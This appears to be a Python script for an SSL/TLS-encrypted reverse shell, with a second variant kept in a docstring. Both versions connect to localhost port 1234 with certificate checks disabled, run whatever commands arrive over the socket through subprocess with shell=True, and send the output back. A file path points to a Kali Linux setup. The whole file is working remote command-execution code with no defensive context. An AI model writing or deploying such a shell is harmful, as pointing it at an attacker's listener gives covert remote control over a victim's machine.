import socket
import ssl
import subprocess

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Wrap the socket in an SSL context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

wrappedSocket = context.wrap_socket(sock, server_hostname='localhost')
wrappedSocket.connect(('localhost', 1234))

try:
   while True:
        received_data = wrappedSocket.recv(1024)
        # Send the output of the command over the SSL connection
        # Execute a system command

        command = subprocess.Popen(received_data.decode().split(),shell=True,stdout=subprocess.PIPE)
        output, err = command.communicate()
        wrappedSocket.sendall(output)
finally:
    wrappedSocket.close()

"""import socket
import ssl
import subprocess

HOST = 'localhost'
PORT = 1234

# PROTOCOL_TLS_CLIENT requires valid cert chain and hostname
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
# Set the verify mode to OPTIONAL
context.check_hostname = False
context.load_verify_locations('/home/kali/Documents/python/python_ssl.pem')

with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
    with context.wrap_socket(sock, server_hostname=HOST) as ssock:
        ssock.connect((HOST, PORT))
        print(ssock.version())
        while ssock:
            rx_data = ssock.recv(1024)
            print("reçu : {}".format(rx_data.decode()))
            command = subprocess.Popen(rx_data.decode().split(),
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, shell=True)
            output, err = command.communicate()
            ssock.sendall(output)"""